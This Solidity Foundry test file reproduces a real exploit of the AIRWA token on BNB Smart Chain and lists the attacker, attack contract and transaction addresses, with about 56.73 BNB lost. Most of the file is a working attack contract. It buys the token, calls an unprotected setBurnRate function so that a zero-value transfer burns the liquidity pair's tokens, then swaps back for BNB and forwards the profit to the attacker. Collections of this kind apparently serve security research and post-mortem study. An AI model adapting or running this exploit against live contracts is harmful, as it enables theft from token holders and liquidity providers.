// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 56.73 BNB
// Attacker : https://bscscan.com/address/0x70f0406e0a50c53304194b2668ec853d664a3d9c
// Attack Contract : https://bscscan.com/address/0x2a011580f1b1533006967bd6dc63af7ae5c82363
// Vulnerable Contract : https://bscscan.com/address/0x3af7da38c9f68df9549ce1980eef4ac6b635223a
// Attack Tx : https://bscscan.com/tx/0x5cf050cba486ec48100d5e5ad716380660e8c984d80f73ba888415bb540851a4

// @Info
// Vulnerable Contract Code :

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1908086092772900909
// Hacking God : N/A

address constant AIRWA = 0x3Af7DA38C9F68dF9549Ce1980eEf4AC6B635223A;
address constant wBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant CAKE_LP = 0xc3551400c032cB0556dee1AD1dC78D1cbC64B7bb;

contract AIRWA_exp is BaseTestWithBalanceLog {
    address attacker = makeAddr("attacker");
    uint256 blocknumToForkFrom = 48_050_724 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        // Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        // fundingToken = BSC_USD;

        vm.label(attacker, "Attacker");
        vm.label(AIRWA, "AIRWA");
        vm.label(wBNB, "WBNB");
        vm.label(BSC_USD, "BSC-USD");
        vm.label(PANCAKE_ROUTER, "PancakeSwap: Router v2");
        vm.label(CAKE_LP, "0xc355_Cake-LP");

        vm.deal(attacker, 1 ether); // Give attacker some BNB
    }

    function testExploit() public {
        emit log_named_decimal_uint("BNB balance before attack", attacker.balance, 18);
        vm.startPrank(attacker);
        AttackContract attackContract = new AttackContract{value: 0.1 ether}();
        attackContract.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("BNB balance after attack", attacker.balance, 18);
    }

    receive() external payable {}
}

contract AttackContract {
    address attacker;

    constructor() payable {
        attacker = msg.sender;
    }

    function attack() public {
        address[] memory path = new address[](3);
        path[0] = address(wBNB);
        path[1] = address(BSC_USD);
        path[2] = address(AIRWA);
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.1 ether}(
            0, path, address(this), block.timestamp + 10
        );

        uint256 balance = IAIRWA(AIRWA).balanceOf(address(this));
        // console.log("Balance of AIRWA in attack contract:", balance);
        IAIRWA(AIRWA).setBurnRate(980);
        IAIRWA(AIRWA).transfer(CAKE_LP, 0);
        IAIRWA(AIRWA).setBurnRate(0);
        IAIRWA(AIRWA).approve(PANCAKE_ROUTER, type(uint256).max);

        path[0] = address(AIRWA);
        path[1] = address(BSC_USD);
        path[2] = address(wBNB);
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance, 0, path, address(this), block.timestamp + 10
        );
    }

    receive() external payable {
        console.log("Received BNB:", msg.value);
        uint256 balance = address(this).balance;
        // console.log("Current balance:", balance);
        if (balance > 0) {
            payable(attacker).transfer(balance); // Send all BNB back to the attacker
        }
    }
}

interface IAIRWA {
    function setBurnRate(uint256 _burnRate) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}
